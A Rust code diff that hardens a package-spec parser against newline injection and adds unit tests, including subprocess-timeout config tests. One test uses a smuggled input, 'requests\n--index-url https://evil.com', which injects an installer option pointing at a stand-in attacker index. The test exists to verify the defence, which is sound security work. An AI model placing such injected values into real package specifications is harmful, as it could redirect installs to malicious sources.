@@ -99,8 +99,15 @@ impl PackageSpec {
         format!("{}{}{}", self.name, extras, self.version.as_deref().unwrap_or(""))
     }
 
-    /// Parse "name==1.0", "name>=1.0,<2.0", or plain "name"
+    /// Parse "name==1.0", "name>=1.0,<2.0", or plain "name".
+    ///
+    /// Embedded `\n` or `\r` characters are stripped as a defence-in-depth
+    /// measure against newline injection.  `resolve_set()` also rejects such
+    /// specs, but sanitising here prevents a malformed `PackageSpec` from
+    /// propagating further through the pipeline.
     pub fn parse(spec: &str) -> Self {
+        let sanitised = spec.replace(['\n', '\r'], "");
+        let spec = sanitised.trim();
         for op in ["==", ">=", "<=", "!=", "~=", ">", "<"] {
             if let Some(idx) = spec.find(op) {
                 return PackageSpec {
@@ -200,6 +207,33 @@ mod tests {
     fn test_parse_trims_whitespace() {
         let s = PackageSpec::parse("  numpy  ");
         assert_eq!(s.name, "numpy");
+    }
+
+    #[test]
+    fn test_parse_strips_newlines() {
+        // The newline is stripped, neutralising the injection vector.
+        // The remaining string is an invalid spec that will be rejected by uv.
+        let s = PackageSpec::parse("requests\n--index-url https://evil.com");
+        let spec = s.to_uv_spec();
+        // Critical property: the assembled spec must not contain \n or \r,
+        // so it cannot act as a uv stdin line separator.
+        assert!(!spec.contains('\n'), "spec must not contain newline: {spec:?}");
+        assert!(!spec.contains('\r'), "spec must not contain CR: {spec:?}");
+    }
+
+    #[test]
+    fn test_global_config_subprocess_timeout_default() {
+        use crate::global_config::GlobalConfig;
+        let cfg = GlobalConfig::default();
+        assert_eq!(cfg.subprocess_timeout_secs, 300);
+    }
+
+    #[test]
+    fn test_global_config_subprocess_timeout_zero_disables() {
+        use crate::global_config::GlobalConfig;
+        let yaml = "subprocess_timeout_secs: 0\n";
+        let cfg: GlobalConfig = serde_yaml::from_str(yaml).unwrap();
+        assert_eq!(cfg.subprocess_timeout_secs, 0);
     }
 
     #[test]
